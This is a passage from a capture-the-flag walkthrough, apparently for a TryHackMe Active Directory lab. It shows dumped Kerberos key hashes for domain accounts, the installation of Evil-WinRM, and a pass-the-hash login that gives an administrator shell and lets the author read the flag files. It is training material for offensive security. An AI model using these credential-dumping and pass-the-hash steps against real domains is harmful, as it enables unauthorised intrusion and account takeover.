spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:8b366fb2f973b82a26ee00882054e354911117403cca5934de0d1ba848b473e8
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:ed07eb1662813ed845489258db4af1b5
ATTACKTIVEDIREC$:des-cbc-md5:f49da7071a619d85
[*] Cleaning up...
```

Now we have the administrators password hash. We don't need to try and crack it, we can simply use a tool like PSExec or Evil-WinRM to pass it. Let's follow the rooms suggestion and use Evil-WinRM:

```text
┌──(root💀kali)-[~/thm/attacktive]
└─# git clone https://github.com/Hackplayers/evil-winrm.git
Cloning into 'evil-winrm'...
remote: Enumerating objects: 36, done.
remote: Counting objects: 100% (36/36), done.
remote: Compressing objects: 100% (25/25), done.
remote: Total 819 (delta 17), reused 25 (delta 11), pack-reused 783
Receiving objects: 100% (819/819), 1.97 MiB | 6.30 MiB/s, done.
Resolving deltas: 100% (469/469), done.

┌──(root💀kali)-[~/thm/attacktive]
└─# cd evil-winrm

┌──(root💀kali)-[~/thm/attacktive/evil-winrm]
└─# gem install evil-winrm
Fetching multi_json-1.15.0.gem
Fetching logging-2.3.0.gem
Fetching rubyntlm-0.6.3.gem
Fetching nori-2.6.0.gem
Fetching little-plugger-1.1.4.gem
Fetching erubi-1.10.0.gem
Fetching gyoku-1.3.1.gem
Fetching gssapi-1.3.1.gem
Fetching httpclient-2.8.3.gem
Fetching builder-3.2.4.gem
Fetching winrm-2.3.6.gem
Fetching winrm-fs-1.3.5.gem
Fetching evil-winrm-2.4.gem
Successfully installed rubyntlm-0.6.3
Successfully installed nori-2.6.0
Successfully installed multi_json-1.15.0
Successfully installed little-plugger-1.1.4
Successfully installed logging-2.3.0
Successfully installed httpclient-2.8.3
Successfully installed builder-3.2.4
Successfully installed gyoku-1.3.1
Successfully installed gssapi-1.3.1
Successfully installed erubi-1.10.0
Successfully installed winrm-2.3.6
Successfully installed winrm-fs-1.3.5
Happy hacking! :)
Successfully installed evil-winrm-2.4
Parsing documentation for rubyntlm-0.6.3
Installing ri documentation for rubyntlm-0.6.3
Parsing documentation for nori-2.6.0
Installing ri documentation for nori-2.6.0
Parsing documentation for multi_json-1.15.0
Installing ri documentation for multi_json-1.15.0
Parsing documentation for little-plugger-1.1.4
Installing ri documentation for little-plugger-1.1.4
Parsing documentation for logging-2.3.0
Installing ri documentation for logging-2.3.0
Parsing documentation for httpclient-2.8.3
Installing ri documentation for httpclient-2.8.3
Parsing documentation for builder-3.2.4
Installing ri documentation for builder-3.2.4
Parsing documentation for gyoku-1.3.1
Installing ri documentation for gyoku-1.3.1
Parsing documentation for gssapi-1.3.1
Installing ri documentation for gssapi-1.3.1
Parsing documentation for erubi-1.10.0
Installing ri documentation for erubi-1.10.0
Parsing documentation for winrm-2.3.6
Installing ri documentation for winrm-2.3.6
Parsing documentation for winrm-fs-1.3.5
Installing ri documentation for winrm-fs-1.3.5
Parsing documentation for evil-winrm-2.4
Installing ri documentation for evil-winrm-2.4
Done installing documentation for rubyntlm, nori, multi_json, little-plugger, logging, httpclient, builder, gyoku, gssapi, erubi, winrm, winrm-fs, evil-winrm after 6 seconds
13 gems installed
```

Now that's installed we can use what we've retrieved so far to connect as the administrator user:

```text
┌──(root💀kali)-[~/thm/attacktive/evil-winrm]
└─# evil-winrm -u administrator -H <HIDDEN> -i 10.10.85.191
Evil-WinRM shell v2.4
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
thm-ad\administrator
```

We're in as admin, let's grab all the flags:

```text
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> dir

    Directory: C:\Users\Administrator\desktop
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  11:39 AM             32 root.txt

*Evil-WinRM* PS C:\Users\Administrator\desktop> more root.txt
TryHackMe{HIDDEN}
```

```text
*Evil-WinRM* PS C:\Users\Administrator\desktop> cd ../../backup/desktop
*Evil-WinRM* PS C:\Users\backup\desktop> dir

    Directory: C:\Users\backup\desktop
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  12:19 PM             26 PrivEsc.txt

*Evil-WinRM* PS C:\Users\backup\desktop> more privesc.txt
TryHackMe{HIDDEN}
```

```text
*Evil-WinRM* PS C:\Users\backup\desktop> cd ../../svc-admin/desktop
*Evil-WinRM* PS C:\Users\svc-admin\desktop> dir

    Directory: C:\Users\svc-admin\desktop
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  12:18 PM             28 user.txt.txt

*Evil-WinRM* PS C:\Users\svc-admin\desktop> more user.txt.txt
TryHackMe{HIDDEN}
```
